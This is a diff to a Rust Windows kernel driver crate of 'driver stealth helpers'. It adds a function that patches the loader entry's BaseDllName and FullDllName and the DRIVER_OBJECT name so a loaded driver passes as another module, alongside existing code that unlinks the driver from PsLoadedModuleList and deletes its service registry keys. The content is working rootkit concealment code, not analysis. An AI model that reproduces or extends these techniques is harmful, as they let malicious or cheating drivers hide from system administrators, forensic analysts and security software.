@@ -1,6 +1,6 @@
 #![no_std]
 
-//! Driver stealth helpers: PsLoadedModuleList unlink and SCM registry cleanup.
+//! Driver stealth helpers: PsLoadedModuleList unlink, module rename, and SCM registry cleanup.
 
 mod log;
 
@@ -95,6 +95,19 @@ pub struct ModuleHideResult {
     pub unlinked: bool,
 }
 
+/// Result of [`camouflage_driver_module`].
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub struct ModuleCamouflageResult {
+    /// `BaseDllName` patched in the loader entry.
+    pub base_dll_name: bool,
+    /// `FullDllName` patched in the loader entry.
+    pub full_dll_name: bool,
+    /// `DRIVER_OBJECT.DriverName` patched.
+    pub driver_object_name: bool,
+    /// Module is not linked in PsLoadedModuleList (e.g. already hidden).
+    pub module_not_linked: bool,
+}
+
 /// Result of [`delete_service_registry`].
 #[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
 pub struct RegistryHideResult {
@@ -145,6 +158,132 @@ pub fn hide_driver_module(driver: *mut DRIVER_OBJECT) -> ModuleHideResult {
     unsafe { ExReleaseResourceLite(resource) };
     result.unlinked = true;
     slog!("hide_driver_module: ok unlinked=true");
+    result
+}
+
+const LDR_FULL_DLL_NAME_OFFSET: usize = 0x48;
+const LDR_BASE_DLL_NAME_OFFSET: usize = 0x58;
+const POOL_FLAG_NON_PAGED: u32 = 0x0000_0040;
+const POOL_TAG_CAMOUFLAGE: u32 = u32::from_ne_bytes(*b"Cmfl");
+
+unsafe extern "system" {
+    fn ExAllocatePool2(pool_flags: u32, number_of_bytes: usize, tag: u32) -> *mut c_void;
+}
+
+/// Patches loader entry and driver object name strings to disguise the loaded image.
+pub fn camouflage_driver_module(
+    driver: *mut DRIVER_OBJECT,
+    base_name: &str,
+    full_path: &str,
+    driver_name: &str,
+    patch_base: bool,
+    patch_full: bool,
+    patch_driver_name: bool,
+) -> ModuleCamouflageResult {
+    let mut result = ModuleCamouflageResult::default();
+    slog!(
+        "camouflage_driver_module: begin driver={driver:p} base={base_name} full={full_path} obj={driver_name}"
+    );
+
+    if driver.is_null() {
+        slog!("camouflage_driver_module: fail driver=null");
+        return result;
+    }
+    if base_name.is_empty() {
+        slog!("camouflage_driver_module: fail base_name empty");
+        return result;
+    }
+    if !patch_base && !patch_full && !patch_driver_name {
+        slog!("camouflage_driver_module: fail no stages requested");
+        return result;
+    }
+
+    let section = unsafe { (*driver).DriverSection };
+    if section.is_null() {
+        slog!("camouflage_driver_module: fail DriverSection=null");
+        return result;
+    }
+
+    if patch_base || patch_full {
+        let Some(resource) = ps_loaded_module_resource() else {
+            slog!("camouflage_driver_module: fail PsLoadedModuleResource not resolved");
+            return result;
+        };
+
+        let entry = section.cast::<LdrDataTableEntry>();
+        if !is_module_linked(entry) {
+            result.module_not_linked = true;
+            slog!("camouflage_driver_module: fail module not linked (already hidden?)");
+            return result;
+        }
+
+        if unsafe { ExAcquireResourceExclusiveLite(resource, 1) == 0 } {
+            slog!("camouflage_driver_module: fail ExAcquireResourceExclusiveLite");
+            return result;
+        }
+
+        if patch_base {
+            let wide = match encode_wide_slice(base_name) {
+                Some(w) => w,
+                None => {
+                    unsafe { ExReleaseResourceLite(resource) };
+                    slog!("camouflage_driver_module: fail base_name too long");
+                    return result;
+                }
+            };
+            let len = wide_len(&wide);
+            result.base_dll_name =
+                write_ldr_unicode_string(section, LDR_BASE_DLL_NAME_OFFSET, &wide[..len]);
+            slog!(
+                "camouflage_driver_module: base_dll_name patched={}",
+                result.base_dll_name
+            );
+        }
+
+        if patch_full {
+            let wide = match encode_wide_slice(full_path) {
+                Some(w) => w,
+                None => {
+                    unsafe { ExReleaseResourceLite(resource) };
+                    slog!("camouflage_driver_module: fail full_path too long");
+                    return result;
+                }
+            };
+            let len = wide_len(&wide);
+            result.full_dll_name =
+                write_ldr_unicode_string(section, LDR_FULL_DLL_NAME_OFFSET, &wide[..len]);
+            slog!(
+                "camouflage_driver_module: full_dll_name patched={}",
+                result.full_dll_name
+            );
+        }
+
+        unsafe { ExReleaseResourceLite(resource) };
+    }
+
+    if patch_driver_name {
+        if driver_name.is_empty() {
+            slog!("camouflage_driver_module: skip driver_name empty");
+        } else {
+            let mut wide = [0u16; 512];
+            let Some(len) = format_driver_object_name(driver_name, &mut wide) else {
+                slog!("camouflage_driver_module: fail driver object name too long");
+                return result;
+            };
+            result.driver_object_name = write_driver_object_name(driver, &wide[..len]);
+            slog!(
+                "camouflage_driver_module: driver_object_name patched={}",
+                result.driver_object_name
+            );
+        }
+    }
+
+    slog!(
+        "camouflage_driver_module: done base={} full={} obj={}",
+        result.base_dll_name,
+        result.full_dll_name,
+        result.driver_object_name
+    );
     result
 }
 
@@ -415,5 +554,95 @@ fn encode_wide(input: &str, out: &mut [u16]) -> bool {
         return false;
     }
     out[index] = 0;
+    true
+}
+
+fn encode_wide_slice(input: &str) -> Option<[u16; 512]> {
+    let mut out = [0u16; 512];
+    let mut index = 0usize;
+    for unit in input.encode_utf16() {
+        if index >= out.len() {
+            return None;
+        }
+        out[index] = unit;
+        index += 1;
+    }
+    Some(out)
+}
+
+fn wide_len(units: &[u16; 512]) -> usize {
+    units.iter().position(|&c| c == 0).unwrap_or(units.len())
+}
+
+fn format_driver_object_name(name: &str, out: &mut [u16; 512]) -> Option<usize> {
+    let mut index = 0usize;
+    let segments: [&str; 2] = if name.starts_with("\\Driver\\") {
+        [name, ""]
+    } else {
+        ["\\Driver\\", name]
+    };
+    for segment in segments {
+        if segment.is_empty() {
+            continue;
+        }
+        for unit in segment.encode_utf16() {
+            if index + 1 >= out.len() {
+                return None;
+            }
+            out[index] = unit;
+            index += 1;
+        }
+    }
+    Some(index)
+}
+
+fn is_module_linked(entry: *mut LdrDataTableEntry) -> bool {
+    if !is_valid_kernel_ptr(entry) {
+        return false;
+    }
+    unsafe {
+        let links = &raw mut (*entry).in_load_order_links;
+        (*links).flink != links && (*links).blink != links
+    }
+}
+
+fn write_ldr_unicode_string(section: *mut c_void, field_offset: usize, wide: &[u16]) -> bool {
+    if wide.is_empty() {
+        return false;
+    }
+    let byte_len = wide.len() * core::mem::size_of::<u16>();
+    let alloc_len = byte_len + core::mem::size_of::<u16>();
+    let buf = unsafe { ExAllocatePool2(POOL_FLAG_NON_PAGED, alloc_len, POOL_TAG_CAMOUFLAGE) };
+    if buf.is_null() {
+        return false;
+    }
+    unsafe {
+        core::ptr::copy_nonoverlapping(wide.as_ptr(), buf.cast::<u16>(), wide.len());
+        *buf.add(byte_len).cast::<u16>() = 0;
+        let us = section.cast::<u8>().add(field_offset).cast::<UNICODE_STRING>();
+        (*us).Length = byte_len as u16;
+        (*us).MaximumLength = alloc_len as u16;
+        (*us).Buffer = buf.cast::<u16>();
+    }
+    true
+}
+
+fn write_driver_object_name(driver: *mut DRIVER_OBJECT, wide: &[u16]) -> bool {
+    if wide.is_empty() {
+        return false;
+    }
+    let byte_len = wide.len() * core::mem::size_of::<u16>();
+    let alloc_len = byte_len + core::mem::size_of::<u16>();
+    let buf = unsafe { ExAllocatePool2(POOL_FLAG_NON_PAGED, alloc_len, POOL_TAG_CAMOUFLAGE) };
+    if buf.is_null() {
+        return false;
+    }
+    unsafe {
+        core::ptr::copy_nonoverlapping(wide.as_ptr(), buf.cast::<u16>(), wide.len());
+        *buf.add(byte_len).cast::<u16>() = 0;
+        (*driver).DriverName.Length = byte_len as u16;
+        (*driver).DriverName.MaximumLength = alloc_len as u16;
+        (*driver).DriverName.Buffer = buf.cast::<u16>();
+    }
     true
 }
